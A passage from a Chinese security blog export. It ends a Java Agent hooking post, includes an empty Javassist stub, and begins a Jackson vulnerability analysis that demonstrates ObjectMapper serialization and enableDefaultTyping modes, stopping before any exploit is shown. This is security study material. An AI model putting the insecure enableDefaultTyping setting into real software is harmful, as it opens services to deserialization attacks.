class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, -<span class="number">78</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">3</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">4</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">6</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">8</span>, -<span class="number">89</span>, -<span class="number">1</span>, -<span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">27</span>]</span><br><span class="line">Fxxk!</span><br><span class="line">Fxxk!</span><br></pre></td></tr></table></figure>

<p>成功替换了字符</p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>本文先介绍了Java Agent相关概率，然后分别实验了静态和动态Hook。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://www.cnblogs.com/rickiyang/p/11368932.html">https://www.cnblogs.com/rickiyang/p/11368932.html</a></li>
<li><a href="https://fynch3r.github.io/Java-Agent%E8%A7%A3%E8%AF%BB/">https://fynch3r.github.io/Java-Agent%E8%A7%A3%E8%AF%BB/</a></li>
<li><a href="https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925">https://zhishihezi.net/b/5d644b6f81cbc9e40460fe7eea3c7925</a></li>
<li><a href="https://su18.org/post/irP0RsYK1/">https://su18.org/post/irP0RsYK1/</a></li>
</ul>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Javassist学习</title>
    <url>/Javassist%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>未完待续……</p>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>Jackson漏洞分析</title>
    <url>/Jackson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<blockquote>
<p>且将新火试新茶，诗酒趁年华。</p>
</blockquote>
<p>Jackson漏洞学习</p>
<span id="more"></span>



<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>Jackson是一个开源的Java序列化和反序列化工具，可以将Java对象序列化为XML或JSON格式的字符串，以及将XML或JSON格式的字符串反序列化为Java对象。</p>
<p>我们知道在序列化和反序列时候容易出现漏洞，比如fastjon跟jackson都是序列化组件，漏洞层出不穷，当然Jackson也一样，历史上产生过不少漏洞</p>
<h2 id="2-Jackson的序列化"><a href="#2-Jackson的序列化" class="headerlink" title="2. Jackson的序列化"></a>2. Jackson的序列化</h2><p>在jackson内部，提供了<code>ObjectMapper.writeValueAsString()</code>和<code>ObjectMapper.readValue()</code>两个方法来实现序列化和反序列化的功能。</p>
<ul>
<li><code>ObjectMapper.writeValueAsString()</code>———序列化</li>
<li><code>ObjectMapper.readValue()</code>————————反序列化</li>
</ul>
<p>添加Maven依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-core --&gt;</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/com.fasterxml.jackson.core/jackson-annotations --&gt;</span></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.7</span><span class="number">.9</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p> Demo测试</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">// &#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json,Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s&quot;</span>, age, name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此用例我们jackson的ObjectMapper创建了一个mapper对象，然后用mapper对象进行序列化与反序列化</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">ObjectMapper mapper = <span class="keyword">new</span> <span class="constructor">ObjectMapper()</span>;</span><br><span class="line">序列化：</span><br><span class="line">mapper.write<span class="constructor">ValueAsString()</span></span><br><span class="line">反序列化：</span><br><span class="line">mapper.read<span class="constructor">Value()</span></span><br></pre></td></tr></table></figure>







<h2 id="3-Jackson多态类型的反序列化"><a href="#3-Jackson多态类型的反序列化" class="headerlink" title="3. Jackson多态类型的反序列化"></a>3. Jackson多态类型的反序列化</h2><p>如果对多态类进行反序列化，如何保证反序列化之后是我们想要的那个特定类呢。Jackson实现了JacksonPolymorphicDeserialization机制来解决这个问题。</p>
<p><strong>JacksonPolymorphicDeserialization</strong>具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种:</p>
<ul>
<li>DefaultTyping</li>
<li>@JsonTypeInfo注解</li>
</ul>
<h3 id="3-1-DefaultTyping"><a href="#3-1-DefaultTyping" class="headerlink" title="3.1 DefaultTyping"></a>3.1 DefaultTyping</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">com<span class="selector-class">.fasterxml</span><span class="selector-class">.jackson</span><span class="selector-class">.databind</span><span class="selector-class">.ObjectMapper</span>.DefaultTyping</span><br></pre></td></tr></table></figure>

<p>Jackson提供一个enableDefaultTyping设置，其包含4个值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">enum</span> <span class="title">DefaultTyping</span> </span>&#123;</span><br><span class="line">    JAVA_LANG_OBJECT,</span><br><span class="line">    OBJECT_AND_NON_CONCRETE,</span><br><span class="line">    NON_CONCRETE_AND_ARRAYS,</span><br><span class="line">    NON_FINAL;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">DefaultTyping</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-1-1-JAVA-LANG-OBJECT"><a href="#3-1-1-JAVA-LANG-OBJECT" class="headerlink" title="3.1.1  JAVA_LANG_OBJECT"></a>3.1.1  JAVA_LANG_OBJECT</h4><p>当类里的属性声明为一个Object时，会对该Object进行序列化和反序列化。</p>
<p>通过<code>mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</code>设置<code>JAVA_LANG_OBJECT</code>属性</p>
<p>我们在示例中新增一个Object对象，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">// &#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:&#123;&quot;length&quot;:100&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, &#123;length=100&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由结果知，反序列化的时候只反序列化了Object的属性，没有将类给反序列化出来。</p>
<p>如果我们添加JAVA_LANG_OBJECT属性。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置JAVA_LANG_OBJECT属性</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">// &#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:[&quot;jackson.Boy&quot;,&#123;&quot;length&quot;:100&#125;]&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, jackson.Boy@4678c730</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>反序列化的结果:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:20,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;shadowtest&quot;</span>,<span class="string">&quot;object&quot;</span>:[<span class="string">&quot;jackson.Boy&quot;</span>,&#123;<span class="string">&quot;length&quot;</span>:100&#125;]&#125;</span><br><span class="line"><span class="attribute">age</span>=20, <span class="attribute">name</span>=shadowtest, jackson.Boy@4678c730</span><br></pre></td></tr></table></figure>

<p>对比不添加JAVA_LANG_OBJECT的结果</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;age&quot;</span>:20,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;shadowtest&quot;</span>,<span class="string">&quot;object&quot;</span>:&#123;<span class="string">&quot;length&quot;</span>:100&#125;&#125;</span><br><span class="line"><span class="attribute">age</span>=20, <span class="attribute">name</span>=shadowtest, &#123;<span class="attribute">length</span>=100&#125;</span><br></pre></td></tr></table></figure>

<p>可以知道，添加JAVA_LANG_OBJECT属性可以一个类里的Object对象也给反序列出来。</p>
<h4 id="3-2-2-OBJECT-AND-NON-CONCRETE"><a href="#3-2-2-OBJECT-AND-NON-CONCRETE" class="headerlink" title="3.2.2 OBJECT_AND_NON_CONCRETE"></a>3.2.2 OBJECT_AND_NON_CONCRETE</h4><p>当类里有 Interface 、 AbstractClass 时，对其进行序列化和反序列化。</p>
<p>设置OBJECT_AND_NON_CONCRETE属性</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>为了测试，我们定义一个Sex接口，用MySex来继承。在Student中定义一个Sex属性，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line">        stu.sex = <span class="keyword">new</span> MySex();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置OBJECT_AND_NON_CONCRETE属性</span></span><br><span class="line">        <span class="comment">//mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当不设置OBJECT_AND_NON_CONCRETE属性是运行报错</p>
<p>设置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Student stu = <span class="keyword">new</span> Student();</span><br><span class="line">        stu.name=<span class="string">&quot;shadowtest&quot;</span>;</span><br><span class="line">        stu.age=<span class="number">20</span>;</span><br><span class="line">        stu.object = <span class="keyword">new</span> Boy();</span><br><span class="line">        stu.sex = <span class="keyword">new</span> MySex();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建ObjectMapper对象</span></span><br><span class="line">        ObjectMapper mapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//设置OBJECT_AND_NON_CONCRETE属性</span></span><br><span class="line">        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行序列化</span></span><br><span class="line">        String json=mapper.writeValueAsString(stu);</span><br><span class="line">        System.out.println(json);<span class="comment">// &#123;&quot;age&quot;:20,&quot;name&quot;:&quot;shadowtest&quot;,&quot;object&quot;:[&quot;jackson.Boy&quot;,&#123;&quot;length&quot;:100&#125;],&quot;sex&quot;:[&quot;jackson.MySex&quot;,&#123;&quot;sex&quot;:0&#125;]&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//用jackson进行反序列化</span></span><br><span class="line">        Student stu1 = mapper.readValue(json, Student.class);</span><br><span class="line">        System.out.println(stu1); <span class="comment">//age=20, name=shadowtest, jackson.Boy@29ee9faa</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> Object object;</span><br><span class="line">    <span class="keyword">public</span> Sex sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;age=%d, name=%s, %s&quot;</span>, age, name, object == <span class="keyword">null</span> ? <span class="string">&quot;null&quot;</span> : object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> length = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySex</span> <span class="keyword">implements</span> <span class="title">Sex</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sex;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(<span class="keyword">int</span> sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看出运行结果跟不开起属性没有啥区别</p>
<h4 id="3-2-3-NON-CONCRETE-AND-ARRAYS"><a href="#3-2-3-NON-CONCRETE-AND-ARRAYS" class="headerlink" title="3.2.3 NON_CONCRETE_AND_ARRAYS"></a>3.2.3 NON_CONCRETE_AND_ARRAYS</h4><p>支持上文全部类型的Array类型。</p>
<p>我们定义一个对象数组。</p>
